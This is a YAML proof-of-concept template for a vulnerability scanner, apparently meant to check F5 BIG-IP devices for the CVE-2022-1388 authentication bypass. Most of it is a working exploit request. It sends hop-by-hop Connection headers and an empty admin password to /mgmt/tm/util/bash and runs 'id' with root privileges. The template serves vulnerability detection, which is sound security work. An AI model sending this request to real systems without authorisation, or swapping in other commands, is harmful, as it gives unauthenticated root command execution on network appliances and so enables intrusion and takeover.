name: poc-yaml-f5-big-ip-cve-2022-1388-rce
manual: true
transport: http
rules:
  detect:
    request:
      cache: true
      method: GET
      path: /mgmt/shared/diagnostics/device-stats
      headers:
        Authorization: Basic YWRtaW46
        X-F5-Auth-Token: "{{authToken}}"
        Connection: X-Forwarded-Host,X-F5-Auth-Token
        Content-Type: application/json
    expression: response.status == 200 && response.body.bcontains(b"lastUpdateMicros") && response.headers["Content-Type"].contains("json")
  r0:
    request:
      cache: true
      method: POST
      path: /mgmt/tm/util/bash
      headers:
        Connection: X-Forwarded-Host,X-F5-Auth-Token
        X-F5-Auth-Token: a
        Authorization: Basic YWRtaW46
        Content-Type: application/json
      body: '{"command":"run","utilCmdArgs":"-c id"}'
    expression: response.status == 200 && response.body.bcontains(b"commandResult") && response.body.bcontains(b"root") && "(u|g)id=\\d+".bmatches(response.body)
expression: r0() || detect()
detail:
  author: Aurora
  links:
    - https://support.f5.com/csp/article/K23605346
  vulnerability:
    id: CT-424129
    level: critical
